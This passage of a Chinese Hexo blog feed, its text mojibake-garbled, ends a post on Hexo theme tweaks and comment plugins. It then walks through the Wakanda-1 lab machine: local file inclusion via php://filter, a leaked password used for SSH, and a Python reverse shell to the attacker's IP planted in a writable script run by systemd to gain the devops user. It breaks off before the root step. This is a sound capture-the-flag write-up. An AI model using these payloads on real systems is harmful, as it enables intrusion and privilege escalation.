punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>åœ¨/layout/layout.ejsä¸­å†™å…¥ï¼š</p><pre class=" language-html"><code class="language-html">{% if theme.fireworks %}>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fireworks<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span> >    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//cdn.bootcss.com/animejs/2.2.0/anime.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> >    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/src/fireworks.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>> {% endif %}</code></pre><p>ç„¶åï¼Œåœ¨ç›¸åº”ä¸»é¢˜çš„configæ–‡ä»¶åŠ å…¥</p><pre class=" language-shell"><code class="language-shell">fireworks: true</code></pre></blockquote><h2 id="9-è®¾ç½®è¯„è®ºåŠŸèƒ½Gitment"><a href="#9-è®¾ç½®è¯„è®ºåŠŸèƒ½Gitment" class="headerlink" title="9.è®¾ç½®è¯„è®ºåŠŸèƒ½Gitment"></a>9.è®¾ç½®è¯„è®ºåŠŸèƒ½Gitment</h2><blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb852eb79447.png" class="lazyload"></p><p>owner githubç”¨æˆ·åï¼Œrepoå­˜å‚¨è¯„è®ºçš„ä»“åº“ï¼ŒclientIdå’ŒclientSecretéœ€è¦è‡ªå·±æ³¨å†Œgithub app</p><p><a href="https://github.com/settings/applications" target="_blank" rel="noopener">https://github.com/settings/applications</a></p><p>åˆ‡è®°Authorization callback URL è¦å¡«å†™CNAMEè§£æçš„åŸŸåï¼ˆæœªè§£æåˆ™å¡«é»˜è®¤githubçš„åŸŸåï¼‰ï¼Œå¦åˆ™å¯èƒ½æ— æ³•ä½¿ç”¨</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb8533843b56.png" class="lazyload"></p><p>ç„¶åå‡„æƒ¨åœ°å‘ç°ä½œè€…æœåŠ¡åœæ­¢äº†ï¼Œå‚è€ƒ<a href="https://www.jianshu.com/p/f2f4c802914b" target="_blank" rel="noopener">https://www.jianshu.com/p/f2f4c802914b</a></p></blockquote><h2 id="10-æ·»åŠ ç›®å½•"><a href="#10-æ·»åŠ ç›®å½•" class="headerlink" title="10.æ·»åŠ ç›®å½•"></a>10.æ·»åŠ ç›®å½•</h2><blockquote><p>åœ¨ä¸»é¢˜çš„æ¨¡æ¿æ–‡ä»¶ï¼Œæ‰¾åˆ°æ–‡ç« å†…å®¹æ¨¡æ¿ï¼Œå°†å…¶æ’å…¥åœ¨å†…å®¹å‰é¢å³å¯ã€‚</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>%- toc<span class="token punctuation">(</span>page.content, <span class="token punctuation">{</span>        class: <span class="token string">'post-toc'</span>,        list_number: <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span> %<span class="token operator">></span></code></pre></blockquote><h2 id="11-æ·»åŠ Gitalk"><a href="#11-æ·»åŠ Gitalk" class="headerlink" title="11.æ·»åŠ Gitalk"></a>11.æ·»åŠ Gitalk</h2><blockquote><p>å·²ç»é›†æˆäº†Gitalkçš„ä¸»é¢˜æŒ‰å¦‚ä¸‹é…ç½®å³å¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc2cd32b93d9.png" class="lazyload"></p><p>ownerå°±æ˜¯ç”¨æˆ·åï¼Œrepoæ˜¯ä»“åº“åï¼Œè‡³äºclientIDï¼ŒclientSecretï¼Œéœ€è¦è‡ªè¡Œç”³è¯·åˆ›å»º OAuth applicationsã€‚è¯„è®ºéœ€è¦æ¶‰åŠ GitHub æˆæƒç™»å½•ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œä½ å…ˆè¦æœ‰ä¸€ä¸ª GitHub applicationã€‚GitHub æˆæƒç™»å½•éµå¾ª <a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">OAuth 2.0 æ ‡å‡†</a>ã€‚OAuth applications åˆ›å»ºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¡«å†™ä¸Šé¢ç›¸åº”çš„å†…å®¹ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc2ceac7ef32.png" class="lazyload"></p></blockquote><h2 id="Gitalk-æŠ¥é”™-redirecté—®é¢˜"><a href="#Gitalk-æŠ¥é”™-redirecté—®é¢˜" class="headerlink" title="Gitalk æŠ¥é”™ redirecté—®é¢˜"></a>Gitalk æŠ¥é”™ redirecté—®é¢˜</h2><blockquote><p>ç”±äºä¹‹å‰å†™çš„authorization callback url ä¸ºhttpåè®®å¼€å¤´ï¼Œç„¶ååˆå¼€å¯äº†githubå¼ºåˆ¶httpsé€‰é¡¹ï¼Œäºæ˜¯ä¼šæŠ¥é”™ï¼Œè·³è½¬åˆ°é¦–é¡µï¼Œå¹¶ä¸”æ— æ³•åˆå§‹åŒ–é—®é¢˜ï¼Œè¿™ä¸ªæ—¶å€™åªéœ€è¦æŠŠ authorization callback url æ”¹æˆhttpsåè®®å³å¯.</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc418107dc99.png" class="lazyload"></p></blockquote><blockquote><p> ç»§ç»­æ›´æ–°ä¸­ã€‚ã€‚ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ‚æ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Gitè´¦æˆ· </tag>
            
            <tag> Hexoæ­å»º </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>wakanda-1-é¶æœºæ¸—é€</title>
      <link href="/2018/09/15/wakanda-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2018/09/15/wakanda-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="å¯¹wakandaé¶æœºçš„æ¸—é€ä¹‹æ—…"><a href="#å¯¹wakandaé¶æœºçš„æ¸—é€ä¹‹æ—…" class="headerlink" title="-å¯¹wakandaé¶æœºçš„æ¸—é€ä¹‹æ—…"></a>-å¯¹wakandaé¶æœºçš„æ¸—é€ä¹‹æ—…</h1><p>â€‹    ä»vulhubä¸Šä¸‹è½½é¶æœºåï¼Œæœ¬æ‰“ç®—åœ¨vmä¸Šæ­å»ºï¼Œåå‘ç°ovaå¯¼å…¥æœ‰ç‚¹é—®é¢˜ï¼Œæ•…åœ¨virtualboxä¸Šæ­å»ºæˆåŠŸï¼Œæˆ‘ä»¬éœ€è¦è·å¾—flag1.txt,flag2.txt,root.txt ä¸‰ä¸ªæ–‡ä»¶çš„ä¿¡æ¯ï¼Œå°†æ”»å‡»æœºï¼Œé¶æœºå‡è®¾ä¸ºæ¡¥æ¥ç½‘å¡æ¨¡å¼ï¼Œå› ä¸ºæˆ‘çš„kaliæ˜¯åœ¨vmé‡Œé¢ã€‚</p><p>â€‹    é¶æœºä¸‹è½½åœ°å€:<a href="https://www.vulnhub.com/entry/wakanda-1,251/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/wakanda-1,251/</a></p><h2 id="0x00-æ¸—é€è¿‡ç¨‹"><a href="#0x00-æ¸—é€è¿‡ç¨‹" class="headerlink" title="0x00 æ¸—é€è¿‡ç¨‹"></a>0x00 æ¸—é€è¿‡ç¨‹</h2><h3 id="1-å¯¹é¶æœºçš„ä¿¡æ¯æ”¶é›†"><a href="#1-å¯¹é¶æœºçš„ä¿¡æ¯æ”¶é›†" class="headerlink" title="1.å¯¹é¶æœºçš„ä¿¡æ¯æ”¶é›†"></a>1.å¯¹é¶æœºçš„ä¿¡æ¯æ”¶é›†</h3><p>æ”»å‡»æœºï¼š</p><pre><code>è‡ªç”¨kali--IPåœ°å€:192.168.1.107</code></pre><p>kali netdiscover å¯åŠ¨:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ebe12b5d.png" alt=""></p><p>â€‹    é‚£ä¹ˆå¯ä»¥å¾—åˆ°é¶æœº IP ï¼š192.168.1.108 ï¼Œæ—¢ç„¶å¾—åˆ°äº†é¶æœºipåœ°å€ï¼Œé‚£ä¹ˆæ‹¿å‡ºnmapç¥å™¨å¯¹å…¶è¿›è¡Œä¸€æ³¢æ‰«æï¼Œè·å¾—æ›´è¯¦ç»†çš„é¶æœºä¿¡æ¯ã€‚</p><pre class=" language-bash"><code class="language-bash">nmap -sV 192.168.1.108</code></pre><p><img src="https://i.loli.net/2018/10/06/5bb89ecba4d21.png" alt=""></p><p>â€‹    ç”±nmapæ‰«æå¾—å‡ºçš„ä¿¡æ¯ï¼Œå¼€å¯äº†80ç«¯å£çš„webæœåŠ¡ï¼Œç„¶åæ˜¯3333ç«¯å£çš„ä¸€ä¸ªOpensshæœåŠ¡ï¼Œè¿™é‡Œéœ€è¦åšä¸€ä¸‹ç¬”è®°ï¼Œsshè¿æ¥æ˜¯3333ç«¯å£è€Œä¸æ˜¯å¸¸è§„çš„22ç«¯å£å“¦ï¼å…ˆå»80ç«¯å£è®¿é—®ä¸€ä¸‹çœ‹çœ‹æƒ…å†µï¼š</p><p><img src="https://i.loli.net/2018/10/06/5bb89ed45deb8.png" alt=""></p><p>â€‹    emmm,å‘ç°å°±ä¸€ä¸ªæ™®é€šé¡µé¢å•¥ä¹Ÿæ²¡æœ‰ï¼Œåªæœ‰ä¸€ä¸ªçœ‹ä¼¼æœ‰ç”¨çš„ Made by@mamadou ???éš¾é“æ˜¯ä¸ªç”¨æˆ·åè¿˜æ˜¯ä¸ªå¯†ç å•¥çš„ï¼Ÿå…ˆåšç¬”è®°è®°ä¸€ä¸‹ï¼ŒèŒæ–°å°±æ˜¯ä»€ä¹ˆéƒ½è¦åšç¬”è®°ï¼Œæ¥ä¸‹æ¥æ‰«ä¸€ä¸‹ç›®å½•çœ‹çœ‹:</p><p><img src="https://i.loli.net/2018/10/06/5bb89edbcd18b.png" alt=""></p><p>â€‹    æ‰«åˆ°å‡ ä¸ªé¡µé¢ï¼Œä½†æ˜¯è²Œä¼¼SIZEéƒ½æ˜¯0ï¼Œè¢«CTFå„ç§è™çš„æˆ‘è¿˜æ˜¯é€‰æ‹©å»çœ‹çœ‹é¡µé¢é‡Œæœ‰æ²¡æœ‰ä¸œè¥¿ã€‚==&gt;è½¬äº†ä¸€åœˆå‘ç°ç¡®å®æ˜¯ç©ºçš„ï¼Œé‚£å’‹åŠï¼Œéš¾é“æ¸—é€ä¹‹æ—…åˆ°æ­¤ç»“æŸï¼Ÿä»”ç»†æƒ³äº†å‡ åˆ†é’Ÿï¼Œæ—¢ç„¶åªæœ‰ä¸€ä¸ªé¡µé¢ï¼Œå¿˜è®°çœ‹æºç äº†ï¼Œæºç å¦‚ä¸‹:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ee81c834.png" alt=""></p><p>â€‹    è¿™ç»¿çš„æˆ‘å‘æ…Œçš„ä¸€ä¸²æ³¨é‡Šï¼Œä¸ç”¨ç›´è§‰æˆ‘çŒœä¹Ÿæ˜¯é¶æœºçš„åˆ‡å…¥ç‚¹äº†ï¼Œlangå‚æ•°æ”¹å˜ä¼šå½±å“é¡µé¢çš„è¯­è¨€æ˜¾ç¤ºï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ langå‚æ•°æ”¹å˜äº†ä½¿ç”¨çš„è¯­è¨€phpæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æ˜¯å’Œæ–‡ä»¶ç›¸å…³çš„æ¼æ´å’¯ï¼</p><p>â€‹    ä½†æ˜¯åªæœ‰è¿™ä¸€ä¸ªé¡µé¢ï¼Œåº”è¯¥å¯ä»¥æ£€æµ‹ä¸€ä¸‹è¿™ä¸ªå‚æ•°æ˜¯å¦å¯ä»¥è¿›è¡Œæœ¬åœ°æ–‡ä»¶åŒ…å«(Local File Include)ï¼Œå°†è¿™å”¯ä¸€çš„ä¸€ä¸ªé¡µé¢çš„å®Œæ•´æºç ç»™è¯»ä¸‹æ¥ã€‚åˆ©ç”¨ä¹‹å‰åšctfè¿˜ç®—æœ‰ä¸€ç‚¹ç‚¹çš„ç»éªŒï¼ˆå‚è€ƒ<a href="https://blog.csdn.net/qq_35544379/article/details/78230629ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨</a> php://filter è¿™ä¸ªåè®®çš„ä¸€äº›å°ç‰¹æ€§æ¥å°†æºç ä»¥base64çš„å½¢å¼downä¸‹æ¥:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89ef3e3358.png" class="lazyload"></p><p>â€‹    ç„¶åbase64è§£ç å¾—åˆ°å¦‚ä¸‹å®Œæ•´çš„æºç ï¼š</p><pre><code>&lt;?php$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember itif (isset($_GET[&#39;lang&#39;])){include($_GET[&#39;lang&#39;].&quot;.php&quot;);}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;    &lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&gt;    &lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&gt;    &lt;title&gt;Vibranium Market&lt;/title&gt;    &lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;    &lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&gt;   &lt;/head&gt;  &lt;body class=&quot;text-center&quot;&gt;    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;      &lt;header class=&quot;masthead mb-auto&quot;&gt;        &lt;div class=&quot;inner&quot;&gt;          &lt;h3 class=&quot;masthead-brand&quot;&gt;Vibranium Market&lt;/h3&gt;          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;          &lt;/nav&gt;        &lt;/div&gt;      &lt;/header&gt;      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;        &lt;p class=&quot;lead&quot;&gt;          &lt;?php            if (isset($_GET[&#39;lang&#39;]))          {          echo $message;          }          else          {            ?&gt;            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!            &lt;?php          }?&gt;        &lt;/p&gt;        &lt;p class=&quot;lead&quot;&gt;          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;Learn more&lt;/a&gt;        &lt;/p&gt;      &lt;/main&gt;      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;        &lt;div class=&quot;inner&quot;&gt;          &lt;p&gt;Made by&lt;a href=&quot;#&quot;&gt;@mamadou&lt;/a&gt;&lt;/p&gt;        &lt;/div&gt;      &lt;/footer&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>â€‹    ohï¼getåˆ°ä¸€ä¸ªpasswordï¼šNiamey4Ever227!!!</p><p>â€‹    åˆ°ç°åœ¨ï¼Œæˆ‘ä»¬æ”¶é›†åˆ°äº†ä½œè€…çš„åç§° mamadouï¼Œå¼€æ”¾åœ¨3333ç«¯å£çš„sshæœåŠ¡ï¼Œç„¶åä¸€ä¸ªpasswordã€‚</p><hr><h3 id="2-å¼€å§‹æ¸—é€é¶æœº"><a href="#2-å¼€å§‹æ¸—é€é¶æœº" class="headerlink" title="2.å¼€å§‹æ¸—é€é¶æœº"></a>2.å¼€å§‹æ¸—é€é¶æœº</h3><p>â€‹    äºŒè¯ä¸è¯´ï¼Œç”¨sshè¯•è¯•è¿œç¨‹ç™»å½•é¶æœºï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> 192.168.1.108 -l mamadou -p 3333</code></pre><p>â€‹    è¾“å…¥Niamey4Ever227!!!ä½œä¸ºå¯†ç ç™»å½•ï¼Œä¸¤ç§’ä¹‹åï¼Œå¼¹å‡ºæ¥ä¸€ä¸ªpython shellç•Œé¢ï¼Ÿè§è¯†çŸ­æµ…è§è¯†çŸ­æµ…ï¼Œè¯•è¯•ç”¨pythonçš„ptyæŠŠå®Œå…¨äº¤äº’å¼çš„ç»ˆç«¯å¼„å‡ºæ¥ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pty <span class="token keyword">import</span> spawn<span class="token operator">>></span><span class="token operator">></span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>mamadou@Wakanda1<span class="token punctuation">:</span><span class="token operator">~</span>$ </code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f067fc33.png" class="lazyload"></p><p>â€‹    é—®é¢˜ä¸å¤§ï¼Œlsçœ‹ä¸€ä¸‹ç›®å½•ï¼Œçœ‹åˆ°äº†æˆ‘ä»¬è¦æ‰¾çš„ç¬¬ä¸€ä¸ªflag,ä¹Ÿå°±æ˜¯flag1.txtï¼Œç„¶åcat flag1.txt ==&gt; Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</p><p>â€‹    æ¥ä¸‹æ¥å°±æ˜¯æ‰¾ä¸€ä¸‹flag2.txtäº†ï¼Œåˆ°ä¸Šçº§ç›®å½•çœ‹åˆ°äº†å¦å¤–ä¸€ä¸ªç”¨æˆ· devops çš„ç›®å½•ï¼Œè¿›å»çœ‹çœ‹æ‰¾åˆ°äº†flag2.txtï¼Œä½†æ˜¯æ²¡æœ‰æƒé™ï¼Œéœ€è¦ä»¥devopsçš„èº«ä»½æ‰“å¼€ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f0ef1687.png" class="lazyload"></p><p>â€‹    å»åˆ«çš„ç›®å½•é€›ä¸€é€›ï¼Œæœç„¶/tmpç›®å½•ä¸‹æ˜¯æœ‰ç‚¹ä¸œè¥¿çš„ï¼Œä½†æ˜¯åªæ˜¯ä¸€ä¸ªtestæ–‡ä»¶ï¼Œé‡Œé¢å«æœ‰ä¸€ä¸ªâ€˜testâ€™å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆä¸åŒã€‚</p><p>â€‹    çœ‹çœ‹è·Ÿdevopsæœ‰å…³ç³»çš„æ–‡ä»¶æœ‰å“ªäº›:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f16aa291.png" class="lazyload"></p><p>â€‹    ç¬¬ä¸€ä¸ªè¿˜æ˜¯ä»…æœ‰çš„ä¸€ä¸ªå°±æ˜¯ä¸€ä¸ªpythonè„šæœ¬çš„æ ·å­ï¼ˆå¿½ç•¥åé¢çš„setup.pyï¼Œå› ä¸ºæ˜¯åšå®Œä¹‹åå†™çš„æ–‡ç« ï¼Œsetup.pyæ˜¯åé¢æˆ‘å¼„è¿›å»çš„æ–‡ä»¶ï¼‰ï¼Œçœ‹çœ‹.antivirus.pyå†…å®¹æ˜¯å•¥:</p><pre class=" language-python"><code class="language-python">open<span class="token punctuation">(</span><span class="token string">'/tmp/test'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span></code></pre><p>â€‹    å°±ä¸€è¡Œï¼Œå’Œtestæ‰¯ä¸Šäº†å…³ç³»ï¼Œå¾€ä¹‹å‰/tmp/ç›®å½•ä¸‹çš„testæ–‡ä»¶å†™å…¥â€˜testâ€™å­—ç¬¦ä¸²ã€‚è¿™ä¸ªpythonè„šæœ¬æ˜¯å¯å†™çš„ï¼Œæˆ‘èƒ½å°†shellå†™å…¥å…¶ä¸­å¹¶ä¸”è¿è¡Œï¼Œä½†æ˜¯åå¼¹çš„ç”¨æˆ·å´ä»ç„¶æ˜¯mamadouï¼Œè€Œä¸æ˜¯æƒ³è¦çš„devopsï¼Œé—®é¢˜åœ¨å“ªå‘¢ï¼Ÿæ€è€ƒå¾ˆä¹…ï¼ŒæŸ¥äº†ä¸‹antivirusçš„æ„æ€â€™æŠ—ç”Ÿç´ â€™ï¼Œæ²¡å•¥ç”¨ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.antivirus.py--payload</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.1.107'</span><span class="token punctuation">,</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token string">'-i'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>â€‹    åæ¥ç»äººç‚¹æ‹¨ï¼Œæç„¶å¤§æ‚Ÿï¼Œå¦‚æœè¿™ä¸ªè„šæœ¬æ˜¯ä¼šè‡ªåŠ¨è¿è¡Œçš„ï¼Œé‚£ä¹ˆå°±ä¸ä¼šåå¼¹mamadouæƒé™çš„shelläº†ï¼Œè€Œæ˜¯å®ƒæœ¬èº«å…·æœ‰çš„devopsæƒé™ï¼Œè€Œç»è¿‡æŸ¥è¯¢èµ„æ–™ï¼Œäº†è§£åˆ°å­˜æ”¾åœ¨/srcç›®å½•ä¸‹çš„ä¸€èˆ¬ä¸ºç³»ç»ŸæœåŠ¡ç±»è„šæœ¬æ–‡ä»¶ï¼Œé‚£ä¹ˆå®ƒè‡ªåŠ¨è¿è¡Œçš„å‡è®¾å°±æ˜¾ç„¶å¯ä»¥æˆç«‹äº†ï¼ˆæˆ‘è¿˜æ˜¯å¯¹æœ‰äº›æ€§è´¨ä¸å¤Ÿäº†è§£ï¼‰ã€‚</p><pre><code>#ç”¨æ­¤å‘½ä»¤æŸ¥çœ‹.antivirus.pyæ˜¯å¦è‡ªåŠ¨è¿è¡Œmamadou@Wakanda1:/srv$ grep -R .antivirus.py / 2&gt;/dev/null/lib/systemd/system/antivirus.service:ExecStart=/usr/bin/env python /srv/.antivirus.py#ç¡®å®åœ¨è‡ªåŠ¨è¿è¡Œï¼ŒæŸ¥çœ‹ä¸€ä¸‹antivirus.serviceæ–‡ä»¶[Unit]Description=AntivirusAfter=network.targetStartLimitIntervalSec=0[Service]Type=simpleRestart=alwaysRestartSec=300User=devopsExecStart=/usr/bin/env python /srv/.antivirus.py[Install]WantedBy=multi-user.target#å¯ä»¥çœ‹åˆ°æ˜¯æ¯300ç§’æ‰§è¡Œä¸€æ¬¡</code></pre><p>â€‹    é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œå†™å…¥çš„shellåŸå°ä¸åŠ¨ï¼Œkaliæ”»å‡»æœºncç›‘å¬7777ç«¯å£ï¼Œç­‰å¾….antivirus.pyè‡ªåŠ¨è¿è¡Œ(ä¸€åˆ†ä¸€ç§’åœ°ç­‰å¾…æ€»æ˜¯æ¼«é•¿çš„ï¼‰ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f341619f.png" class="lazyload"></p><p>â€‹    æœä¸å…¶ç„¶ï¼Œè·å¾—äº†åå¼¹devopsæƒé™çš„shellï¼Œé‚£ä¹ˆcat flag2.txt ==&gt;Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</p><p>â€‹    é‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯æ‹¿ä¸‹rootæƒé™ï¼Œæ”»å…¥rootç›®å½•äº†ã€‚</p><hr><h3 id="3-æ”»ç ´root"><a href="#3-æ”»ç ´root" class="headerlink" title="3.æ”»ç ´root"></a>3.æ”»ç ´root</h3><p>â€‹    å…ˆçœ‹çœ‹devopsç”¨æˆ·æƒé™å¤§æ¦‚æ˜¯æ€æ ·çš„, æ‰§è¡Œsudo -lå‘½ä»¤ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f44d2154.png" class="lazyload"></p><p>â€‹    ç„¶è€Œï¼Œåªæœ‰ä¸€ä¸ªpipå‘½ä»¤æ˜¯å¯ä»¥ä¸éœ€è¦rootæƒé™å°±èƒ½æ‰§è¡Œçš„ï¼Œè¯•è¯•pip install falskï¼Œæ²¡é—®é¢˜ã€‚</p><p>â€‹    é‚£ä¹ˆæ€æ 